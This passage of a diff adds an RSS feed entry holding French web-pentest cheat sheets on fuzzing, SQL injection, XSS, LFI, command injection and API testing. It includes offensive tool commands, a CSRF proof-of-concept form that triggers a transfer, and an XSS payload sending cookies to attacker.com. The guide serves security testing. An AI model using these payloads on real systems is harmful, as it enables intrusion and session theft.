+&lt;/h4&gt;&lt;h5 id=&#34;1-découverte-de-chemins-et-fichiers&#34;&gt;&lt;strong&gt;1. Découverte de chemins et fichiers&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;FFUF&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ -mc 200,301,302&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Dirsearch&lt;/strong&gt; (Extensions courantes) :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;dirsearch -u http://example.com -e php,asp,aspx,jsp,txt -w /path/to/wordlist.txt&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;2-recherche-de-paramètres-cachés&#34;&gt;&lt;strong&gt;2. Recherche de paramètres cachés&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;WFuzz&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;wfuzz -c -z file,/path/to/wordlist.txt -u http://example.com/page?FUZZ=value&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;3-recherche-de-fichiers-sensibles&#34;&gt;&lt;strong&gt;3. Recherche de fichiers sensibles&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;ParamSpider&lt;/strong&gt; (Récupérer des URLs avec paramètres) :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;python3 paramspider.py -d example.com -o output.txt&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;fiche-4--tests-dapplications-web&#34;&gt;&lt;strong&gt;FICHE 4 : Tests d’applications web&lt;/strong&gt;
+&lt;/h3&gt;&lt;h4 id=&#34;objectif--identifier-des-vulnérabilités-courantes&#34;&gt;&lt;strong&gt;Objectif : Identifier des vulnérabilités courantes.&lt;/strong&gt;
+&lt;/h4&gt;&lt;h5 id=&#34;1-sql-injection&#34;&gt;&lt;strong&gt;1. SQL Injection&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;SQLMap&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sqlmap -u &amp;quot;http://example.com/page?id=1&amp;quot; --dbs sqlmap -u &amp;quot;http://example.com/page?id=1&amp;quot; --tables -D database_name&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;2-cross-site-scripting-xss&#34;&gt;&lt;strong&gt;2. Cross-Site Scripting (XSS)&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Tests manuels&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;XSS&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;XSStrike&lt;/strong&gt; (Automatisation) :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;xsstrike http://example.com&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;3-inclusion-de-fichiers-lfi&#34;&gt;&lt;strong&gt;3. Inclusion de fichiers (LFI)&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;FFUF (Fuzz des chemins)&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ffuf -u http://example.com/page?file=../../FUZZ -w /path/to/lfi-wordlist.txt&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;4-command-injection&#34;&gt;&lt;strong&gt;4. Command Injection&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Fuzzing avec WFuzz&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;wfuzz -c -z file,/path/to/payloads.txt -u http://example.com/command?input=FUZZ&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;fiche-5--analyse-des-apis&#34;&gt;&lt;strong&gt;FICHE 5 : Analyse des APIs&lt;/strong&gt;
+&lt;/h3&gt;&lt;h4 id=&#34;objectif--découvrir-des-endpoints-et-tester-les-vulnérabilités-des-apis&#34;&gt;&lt;strong&gt;Objectif : Découvrir des endpoints et tester les vulnérabilités des APIs.&lt;/strong&gt;
+&lt;/h4&gt;&lt;h5 id=&#34;1-découverte-dapi&#34;&gt;&lt;strong&gt;1. Découverte d’API&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Documentation (Swagger)&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;apispecparser -u http://example.com/api-docs&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;2-fuzzing-des-apis&#34;&gt;&lt;strong&gt;2. Fuzzing des APIs&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;FFUF (Endpoints)&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ffuf -u http://example.com/api/v1/FUZZ -w /path/to/api-wordlist.txt&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;3-injection-graphql&#34;&gt;&lt;strong&gt;3. Injection GraphQL&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;GraphQLMap&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;graphqlmap -u http://example.com/graphql&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;fiche-6--exploitation-et-poc&#34;&gt;&lt;strong&gt;FICHE 6 : Exploitation et PoC&lt;/strong&gt;
+&lt;/h3&gt;&lt;h4 id=&#34;objectif--valider-les-vulnérabilités&#34;&gt;&lt;strong&gt;Objectif : Valider les vulnérabilités.&lt;/strong&gt;
+&lt;/h4&gt;&lt;h5 id=&#34;1-exploitation-des-xss&#34;&gt;&lt;strong&gt;1. Exploitation des XSS&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Dalfox&lt;/strong&gt; :
+&lt;code&gt;dalfox url http://example.com/vulnpage&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;2-exploitation-des-failles-csrf&#34;&gt;&lt;strong&gt;2. Exploitation des failles CSRF&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;CSRF PoC Génération&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;form method=&amp;quot;POST&amp;quot; action=&amp;quot;http://example.com/transfer&amp;quot;&amp;gt;     &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;amount&amp;quot; value=&amp;quot;1000&amp;quot;&amp;gt;     &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Exploit CSRF&amp;quot;&amp;gt; &amp;lt;/form&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;3-proof-of-concept-poc&#34;&gt;&lt;strong&gt;3. Proof of Concept (PoC)&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Exemple (XSS)&lt;/strong&gt; :
+&lt;code&gt;&amp;lt;script&amp;gt; fetch(&#39;https://attacker.com/steal?cookie=&#39; + document.cookie); &amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
